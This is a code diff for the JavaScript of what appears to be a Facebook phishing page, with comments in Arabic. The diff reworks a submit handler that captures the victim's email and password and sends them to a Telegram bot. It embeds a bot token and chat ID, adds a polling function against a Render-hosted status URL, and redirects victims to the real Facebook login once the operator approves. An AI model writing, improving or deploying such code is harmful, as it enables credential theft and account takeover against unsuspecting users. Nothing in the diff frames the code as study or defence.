@@ -1,14 +1,14 @@
-
 document.getElementById('submit-btn').addEventListener('click', () => {
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
+    // إرسال البيانات إلى تيليجرام مع أزرار قبول/رفض
     fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             chat_id: '5443898294',
-            text: `Login Attempt\nEmail: ${email}\nPassword: ${password}`,
+            text: `🔐 Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`,
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -19,19 +19,28 @@ document.getElementById('submit-btn').addEventListener('click', () => {
             }
         })
     });
+
+    // نبدأ في التحقق من حالة القبول/الرفض كل 2 ثانية
+    checkLoginStatus();
 });
 
-// المستخدم ينتظر رد الأدمن (أنت)
-setInterval(() => {
-    fetch('/get-status')
-        .then(res => res.json())
-        .then(data => {
-            if (data.accepted) {
-                window.location.href = 'https://www.facebook.com/login';
-            }
+function checkLoginStatus() {
+    const interval = setInterval(() => {
+        fetch('https://login-vpns.onrender.com/get-status') // ← رابط موقعك على Render
+            .then(res => res.json())
+            .then(data => {
+                if (data.accepted) {
+                    clearInterval(interval); // نوقف التحقق
+                    window.location.href = 'https://www.facebook.com/login';
+                }
 
-            if (data.rejected) {
-                document.getElementById('error-message').style.display = 'block';
-            }
-        });
-}, 2000);
+                if (data.rejected) {
+                    clearInterval(interval); // نوقف التحقق
+                    document.getElementById('error-message').style.display = 'block';
+                }
+            })
+            .catch(err => {
+                console.error('خطأ أثناء التحقق من الحالة:', err);
+            });
+    }, 2000);
+}
